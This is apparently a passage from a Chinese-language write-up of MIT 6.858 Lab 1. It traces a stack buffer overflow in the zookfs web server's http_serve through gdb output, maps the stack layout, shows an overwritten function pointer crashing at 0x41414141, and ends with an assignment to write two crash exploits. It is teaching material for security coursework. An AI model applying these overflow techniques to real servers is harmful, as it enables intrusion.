0xbfffeed0:     'A' <repeats 200 times>...
0xbfffef98:     'A' <repeats 200 times>...
0xbffff060:     'A' <repeats 200 times>...
0xbffff128:     'A' <repeats 200 times>...
0xbffff1f0:     'A' <repeats 25 times>
0xbffff20a:     "\005\b|\365\377\277"
0xbffff211:     ""
0xbffff212:     ""
0xbffff213:     ""
(gdb) p sizeof reqpath  [reqpath不会溢出]
$3 = 2048
(gdb) p sizeof env      [env不会溢出]
$4 = 8192
[继续用n命令执行]
85          if (sendfd(svcfds[i], env, env_len, fd) <= 0)
[此时zookd将请求发送给zookfs]
(gdb) quit
```

`zookd`此时并不存在缓冲区溢出，接下来分析`zookfs`。

在`zookfs.c`中，`http_serve()`函数以`REQUEST_URI`环境变量为参数。在`http_serve`处设置断点，分析栈结构。

``` gas
$ gdb -p $(pgrep zookfs-exstack)
...
(gdb) b http_serve
Breakpoint 1 at 0x804951c: file http.c, line 275.
[运行漏洞触发程序]
(gdb) c
Continuing.
[New process 5076]
[Switching to process 5076]

Breakpoint 1, http_serve (fd=3, name=0x80510b4 "/", 'A' <repeats 199 times>...) at http.c:275
warning: Source file is more recent than executable.
275         void (*handler)(int, const char *) = http_serve_none;
(gdb) p $ebp
$1 = (void *) 0xbfffde08
(gdb) p &handler
$2 = (void (**)(int, const char *)) 0xbfffddfc
(gdb) p &pn
$3 = (char (*)[1024]) 0xbfffd9fc
(gdb) p &st
$4 = (struct stat *) 0xbfffd9a4
(gdb) p &fd
$5 = (int *) 0xbfffde10
(gdb) P &name
$6 = (const char **) 0xbfffde14
(gdb) x $ebp+4
0xbfffde0c:     0x08048d86
```

根据上面的调试信息绘制`http_serve()`的栈结构：

```
+———————————————————————-+   
|          name          |<——— (+12)   =0xbfffde14       
+———————————————————————-+   
|        fd = 3          |<——— (+8)    =0xbfffde10                                  
+———————————————————————-+                                 
|     return address     |<——— (+4)    =0xbfffde0c 
+———————————————————————-+                             
|          ebp           |<——— (0)     =0xbfffde08
+———————————————————————-+
|                        |
+————————————————————————+
|    void (*handler)     |<——— (-12)   =0xbfffddfc
+————————————————————————+
|pn[1023]   ^            |
|           |            |
|           |       pn[0]|<——— (-1036) =0xbfffd9fc
+————————————————————————+
|    struct stat st      | 
|       (88bytes)        |<——— (-1124) =0xbfffd9a4
+———————————————————————-+

```

继续执行到`strcat()`，

``` gas
(gdb) n
279         getcwd(pn, sizeof(pn));
(gdb) n
280         setenv("DOCUMENT_ROOT", pn, 1);
(gdb) n
282         strcat(pn, name);
(gdb) p pn
$7 = "/home/httpd/lab\000", 'A' <repeats 504 times>...
(gdb) p strlen(name)
$8 = 1025
(gdb) p sizeof pn
$9 = 1024
```

此处将执行`strcat()`，在`pn`中已经包含的来自`getcwd()`的字符串后面加上长度1025的`name`，将超过`pn`所分配的大小1024，导致缓冲区溢出。接着执行一步，并查看缓冲区溢出情况。

``` gas
(gdb) n
283         split_path(pn);
(gdb) x/10s pn
0xbfffd9fc:     "/home/httpd/lab/", 'A' <repeats 184 times>...
0xbfffdac4:     'A' <repeats 200 times>...
0xbfffdb8c:     'A' <repeats 200 times>...
0xbfffdc54:     'A' <repeats 200 times>...
0xbfffdd1c:     'A' <repeats 200 times>...
0xbfffdde4:     'A' <repeats 40 times>
0xbfffde0d:     "\215\004\b\003"
0xbfffde12:     ""
0xbfffde13:     ""
0xbfffde14:     "\264\020\005\b"
(gdb) x &handler
0xbfffddfc:     'A' <repeats 16 times>
(gdb) x $ebp
0xbfffde08:     "AAAA"
(gdb) x $ebp+4
0xbfffde0c:     ""

```

在`pn`之前的缓冲区，包括`handler`和`$ebp`，已经被字符`A`覆盖，但返回地址并没有被完全改写。该如何改写?

``` gas
(gdb) n
285         if (!stat(pn, &st))
(gdb) n
296         handler(fd, pn);
(gdb) n

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) bt
#0  0x41414141 in ?? ()
#1  0x080495e8 in http_serve (fd=3, name=0x80510b4 "/", 'A' <repeats 199 times>...) at http.c:296
#2  0x08048d00 in main (argc=<error reading variable: Cannot access memory at address 0x41414149>,
    argv=<error reading variable: Cannot access memory at address 0x4141414d>) at zookfs.c:39
```

继续执行到`handler(fd, pn);`，由于`handler`变量被改写为`0x41414141`，导致程序崩溃。这发生在先前发现的`strcpy()`漏洞之前。这个示例并没有利用改写返回地址来劫持控制流。

---

## 作业：寻找并触发漏洞

实验资料：[MIT 6.858 Computer Systems Security](http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-858-computer-systems-security-fall-2014/index.htm)中Lab 1。

寻找并触发2个新的缓冲区溢出漏洞，详细描述漏洞并触发过程。

改写漏洞利用模板`exploit-template.py`，将两个漏洞利用程序分别命名为`exploit-2a.py`和`exploit-2b.py`。最后，用`make check-crash`命令来验证是否能够令服务器崩溃。

**提示**：HTTP请求中不只包括URL












